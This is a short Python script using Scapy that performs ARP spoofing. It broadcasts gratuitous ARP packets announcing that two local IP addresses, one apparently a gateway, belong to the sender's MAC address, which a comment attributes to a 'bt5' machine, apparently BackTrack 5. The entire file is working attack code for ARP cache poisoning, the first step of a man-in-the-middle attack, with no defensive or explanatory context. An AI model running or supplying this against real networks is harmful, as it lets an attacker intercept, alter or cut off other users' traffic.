from scapy.all import*

MY_MAC = '02:00:1e:3f:0c:01'	#bt5's MAC address
BCAST_MAC = 'ff:ff:ff:ff:ff:ff'


def gratuitous_ARP(bcast_ip_addr):
	arp = ARP(psrc = bcast_ip_addr, hwsrc = MY_MAC, pdst = bcast_ip_addr)
	return Ether(dst = BCAST_MAC) / arp


def main():
	pkt = gratuitous_ARP("10.10.111.101")
	sendp(pkt)
	pkt = gratuitous_ARP("10.10.111.1")
	sendp(pkt)

if __name__=="__main__": main()
